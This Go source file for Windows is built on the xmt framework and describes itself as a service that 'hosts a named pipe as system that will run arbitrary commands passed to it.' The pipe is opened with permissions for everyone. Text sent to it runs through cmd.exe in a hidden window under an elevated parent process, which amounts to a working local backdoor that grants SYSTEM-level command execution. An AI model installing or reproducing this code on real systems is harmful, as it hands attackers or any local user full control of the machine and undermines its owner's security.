// +build windows

package main

import (
	"bytes"
	"io"
	"net"
	"strings"
	"sync"

	"github.com/iDigitalFlame/xmt/cmd"
	"github.com/iDigitalFlame/xmt/com/pipe"
	"github.com/iDigitalFlame/xmt/device/devtools"
)

var bufs = sync.Pool{
	New: func() interface{} {
		return new(bytes.Buffer)
	},
}

// server.go
// Hosts a named pipe as system that will run arbitrary commands passed to it.

func main() {
	(&devtools.Service{Start: listen}).Run()
}
func listen() {
	l, err := pipe.ListenPerms(pipe.Format("<PIPENAME>"), pipe.PermEveryone)
	if err != nil {
		panic(err)
	}
	for {
		c, err := l.Accept()
		if err != nil {
			e, ok := err.(net.Error)
			if ok && e.Timeout() {
				continue
			}
			if ok && !e.Timeout() && !e.Temporary() {
				break
			}
			continue
		}
		b := bufs.Get().(*bytes.Buffer)
		io.Copy(b, c)
		c.Close()
		e := cmd.NewProcess("cmd.exe", "/c", strings.ReplaceAll(string(b.Bytes()), "\n", ""))
		b.Reset()
		// Fix a bug where cmd DOES NOT like the system working directory.
		e.Dir = "C:\\"
		bufs.Put(b)
		e.SetWindowDisplay(0)
		e.SetParent(cmd.F().SetElevated(true).SetSession(false))
		e.Start()
	}
}
